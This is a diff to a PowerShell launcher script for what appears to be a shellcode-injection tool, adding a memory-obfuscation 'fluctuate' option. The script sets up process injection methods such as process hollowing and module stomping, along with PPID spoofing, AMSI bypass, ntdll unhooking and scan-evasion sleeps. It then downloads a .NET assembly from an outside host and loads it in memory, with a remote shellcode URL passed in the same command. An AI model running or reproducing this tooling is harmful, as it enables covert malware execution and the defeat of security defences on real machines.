@@ -45,62 +45,65 @@ $H = 0
 # [/flipSleep] time to sleep with PAGE_NOACCESS on shellcode memory region before resuming the thread in milliseconds (0 is disable memory protection flip, used in "currentthread" and "remotethreadsuspended")
 $I = 0
 
+# [/fluctuate] protection value to fluctuate with that will be applied to the memory region where the shellcode resides; this option also activates memory obfuscation ("RW", used in "currentthread")
+$J = 0
+
 # [/image] path to the image of a newly spawned process to inject into (used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 # if there're spaces in the image path, replace them with asterisk (*) characters (e.g., C:\Program Files\Mozilla Firefox\firefox.exe -> C:\Program*Files\Mozilla*Firefox\firefox.exe)
-$J = "C:\Windows\System32\svchost.exe"
+$K = "C:\Windows\System32\svchost.exe"
 
 # existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
-$K = "notepad"
+$L = "notepad"
 
 # parent process name to spoof the original value (use "0" to disable PPID spoofing, used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
-$L = "explorer"
+$M = "explorer"
 
 # [/dll] loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
-$M = "msvcp_win.dll"
+$N = "msvcp_win.dll"
 
 # [/stompDll] name of the module (DLL) to stomp (used in "modulestomping")
-$N = "xpsservices.dll"
+$O = "xpsservices.dll"
 
 # [/stompExport] exported function name to overwrite (used in "modulestomping")
-$O = "DllCanUnloadNow"
+$P = "DllCanUnloadNow"
 
 # [/sleep] number of seconds (approx.) to sleep before execution to evade potential in-memory scan (10s-60s)
-$P = 0
+$Q = 0
 
 # [/blockDlls] block 3rd-party DLLs ("True" / "False", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
-$Q = "True"
-
-# [/am51] bypass AMSI for current process ("True" / "False" / "Force")
 $R = "True"
 
-# [/remoteAm51] bypass AMSI for remote process ("True" / "False" / "Force", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping", "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
+# [/am51] bypass AMSI for current process ("True" / "False" / "Force")
 $S = "True"
 
+# [/remoteAm51] bypass AMSI for remote process ("True" / "False" / "Force", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping", "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
+$T = "True"
+
 # [/unhook] unhook ntdll.dll ("True" / "False")
-$T = "False"
+$U = "False"
 
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
 if ($methods.Contains($A)) {
-    $K = (Start-Process -WindowStyle Hidden -PassThru $K).Id
+    $L = (Start-Process -WindowStyle Hidden -PassThru $L).Id
 }
 
 $methods = @("remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
 if ($methods.Contains($A)) {
     try {
-        $L = (Get-Process $L -ErrorAction Stop).Id
+        $M = (Get-Process $M -ErrorAction Stop).Id
         # if multiple processes exist with the same name, arbitrary select the first one
-        if ($L -is [array]) {
-            $L = $L[0]
+        if ($M -is [array]) {
+            $M = $M[0]
         }
     }
     catch {
-        $L = 0
+        $M = 0
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /image:${J} /pid:${K} /ppid:${L} /dll:${M} /stompDll:${N} /stompExport:${O} /sleep:${P} /blockDlls:${Q} /am51:${R} /remoteAm51:${S} /unhook:${T}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /fluctuate:${J} /image:${K} /pid:${L} /ppid:${M} /dll:${N} /stompDll:${O} /stompExport:${P} /sleep:${Q} /blockDlls:${R} /am51:${S} /remoteAm51:${T} /unhook:${U}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
